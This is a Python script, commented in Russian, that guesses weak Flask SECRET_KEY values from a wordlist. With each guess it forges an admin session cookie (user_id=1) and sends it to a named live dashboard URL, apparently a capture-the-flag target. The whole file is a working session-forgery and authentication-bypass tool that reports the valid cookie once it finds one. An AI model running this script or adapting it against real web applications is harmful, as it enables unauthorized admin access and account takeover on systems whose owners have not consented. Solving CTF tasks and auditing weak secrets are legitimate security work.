#!/usr/bin/env python3
"""
Подбор слабого Flask SECRET_KEY и подделка сессии (user_id=1).
Flask подписывает куку через itsdangerous, salt='cookie-session'.
Установка: pip install itsdangerous requests
Запуск: python3 flask_secret_bruteforce.py
"""
import warnings
warnings.filterwarnings("ignore", message="urllib3 v2 only supports OpenSSL")
import requests

try:
    from itsdangerous import URLSafeTimedSerializer
except ImportError:
    print("Установи: pip install itsdangerous")
    exit(1)

TARGET = "http://sandwich.duckerz.ru/dashboard"
# csrf можно оставить из оригинальной сессии или пустой — сервер может не проверять на GET
FAKE_PAYLOAD = {"csrf_token": "19bbca74ca33b36c2c41f01386802c25ea43b1ef", "user_id": 1, "username": "admin"}
FLASK_SALT = "cookie-session"  # дефолт Flask

# Типичные слабые/дефолтные секреты в CTF и в проде
COMMON_SECRETS = [
    "secret", "secret_key", "secret key", "flask", "Flask", "FLASK",
    "dev", "development", "debug", "key", "password", "changeme",
    "supersecret", "super-secret", "cookie-secret", "session-secret",
    "flask-secret-key", "my_secret_key", "app-secret", "default",
    "12345", "123456", "qwerty", "admin", "test", "ctf", "flag",
    "sandwich", "duckerz", "duckerz.ru",  # по названию таска/домена
    "", "x", "abc", "temp", "tmp", "none", "None",
]


def forge_session(secret: str, payload: dict):
    """Подписывает payload как Flask session. Возвращает строку куки или None."""
    try:
        s = URLSafeTimedSerializer(
            secret_key=secret,
            salt=FLASK_SALT,
            signer_kwargs={"key_derivation": "hmac", "digest_method": "sha1"},
        )
        return s.dumps(payload)
    except Exception:
        return None


def check_cookie(cookie_value: str) -> bool:
    """Возвращает True, если сервер отдал 200 и контент не пустой (успешный вход)."""
    r = requests.get(
        TARGET,
        cookies={"session": cookie_value},
        allow_redirects=False,
        timeout=8,
        headers={"User-Agent": "CTF/1.0"},
    )
    return r.status_code == 200 and len(r.content) > 1000


def main():
    print("=== Подбор Flask SECRET_KEY (слабые/типичные значения) ===\n")
    for i, secret in enumerate(COMMON_SECRETS):
        cookie = forge_session(secret, FAKE_PAYLOAD)
        if not cookie:
            continue
        if check_cookie(cookie):
            print(f"  [OK] Найден секрет: {repr(secret)}")
            print(f"  Кука для user_id=1: {cookie[:60]}...")
            print("\n  Подставь в браузер cookie session=<полное значение> и открой /dashboard")
            return
        if (i + 1) % 10 == 0:
            print(f"  проверено {i + 1}/{len(COMMON_SECRETS)}...")
    print("  Слабый секрет не найден. Можно расширить список в COMMON_SECRETS или искать утечку ключа.")


if __name__ == "__main__":
    main()
